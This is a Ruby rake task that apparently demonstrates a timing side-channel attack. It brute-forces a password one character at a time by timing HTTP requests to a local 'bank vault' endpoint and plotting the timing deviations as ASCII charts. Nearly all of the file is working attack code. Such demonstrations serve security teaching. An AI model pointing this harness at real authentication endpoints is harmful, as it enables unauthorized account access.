require 'benchmark'
require 'httparty'
require 'ascii_charts'
require 'ruby-progressbar'
require 'slow_equality'

namespace :password_cracker do

  REAL_PASSWORD = "khxdhkjhs"

  # Guess the password above, and return true if the guess is right
  def guess_password(attempt)
    SlowEquality.str_eql?(REAL_PASSWORD, attempt)
  end

  # Guess the password to the bank vault, and return whether our request
  # was successful or not
  def guess_http_password(attempt)
    HTTParty.get(
      "http://localhost:3001/bank/vault",
      headers: {
        "Authorization" => "Token token=#{attempt}"
      }
    ).success?
  end

  # Uses Benchmark to measure how long a guess takes
  def timed_guess_password(attempt)
    correct = false

    time = Benchmark.realtime do
      correct = guess_http_password(attempt)
    end

    # Return whether we guessed correctly, and the time taken to execute
    # that guess.
    # Multiply the time because `ascii_charts` seems to be flaky when handling
    # really small floats
    return correct, time * 1000
  end

  # Given a Hash of measurements, where the key is a character, and the value
  # is an array of measurements of the time it took to perform equality operations
  # using that character
  # Returns a 2D array of points for a histogram:
  #   x = the character
  #   y = how much longer or faster this character's measurements were compared
  #       to all the other character's measurements.
  def calculate_variance(measurements)
    # Get the mean (average) time for each character
    means = []
    measurements.each do |char, measurements|
      mean = measurements.inject{ |sum, el| sum + el }.to_f / measurements.size
      means << [char, mean]
    end

    # What was the mean time for _all_ characters?
    all_values = measurements.values.flatten
    global_mean = all_values.inject{ |sum, el| sum + el }.to_f / all_values.size

    # Now plot each character as the amount the varied from the global mean
    variance = means.collect do |char_and_mean|
      [
        char_and_mean[0],
        (global_mean - char_and_mean[1]).abs
      ]
    end
  end

  def display_bar_chart(values)
    puts AsciiCharts::Cartesian.new(
      values,
      bar: true
    ).draw
  end

  # Given a current_guess, will iterate over the (a..z) character range, and
  # figure out which of those is most likely to be the next character in the
  # password.
  # Returns a Hash
  #   guess: the string password we are guessing
  #   next_guess: a character, which is most likely to be next in the sequence
  #   correct: whether we've figured out the password
  def guess_next_character(current_guess, verbose: true)
    # Initialize a Hash where each a-z character has an empty array
    chars = ('a'..'z').to_a
    measurements = Hash[chars.map { |char| [char, []] }]
    # And precompute the guesses to save time
    guesses = Hash[chars.map { |char| [char, "#{current_guess}#{char}"]}]

    # iterations = 10_000_000
    progressbar = ProgressBar.create

    # Iterate 100 times for the progressbar
    100.times do
      # Iterate 100 times more, for 1000 experiments per character
      10.times do

        # To avoid baises, let's shuffle the order we test the characters
        chars.sample(chars.length).each do |char|

          # Guess the current password + this char
          guess = guesses[char]
          correct, time = timed_guess_password(guess)

          if correct
            # Got it! Return a payload with the correct password
            return {
              guess: guess,
              correct: true,
              next_guess: nil
            }
          else
            measurements[char] << time
          end

        end
      end

      progressbar.increment
    end

    puts "Measured. Calculating..."
    variance = calculate_variance(measurements)

    puts "Calculated. Plotting..."
    display_bar_chart(variance)

    # Our best guess is the character with the largest variance.
    elem = variance.max_by { |variant| variant[1] }

    # TODO: if there is no clear outlier, then we should assume we've got it
    # wrong and just give up, or go backwards.

    {
      guess: current_guess,
      correct: false,
      next_guess: elem[0]
    }
  end


  desc "Use a timing attack and statistics to guess a password"
  task :crack do

    guess = ""
    loop do
      # Do a guess, and grab the result
      result = guess_next_character(guess)

      if result[:correct]
        puts "\n\nWoot! I guess the password is '#{result[:guess]}'"
        break

      # We guessed wrong, but have the next most likely character
      else
        guess << result[:next_guess]
        puts "Not there yet... I'll try guessing what comes after '#{guess}'"
      end

      # Don't run forever.
      if guess.length > 100
        puts "I give up! My final guess was '#{guess[:guess]}'"
        break
      end

    end

  end

end
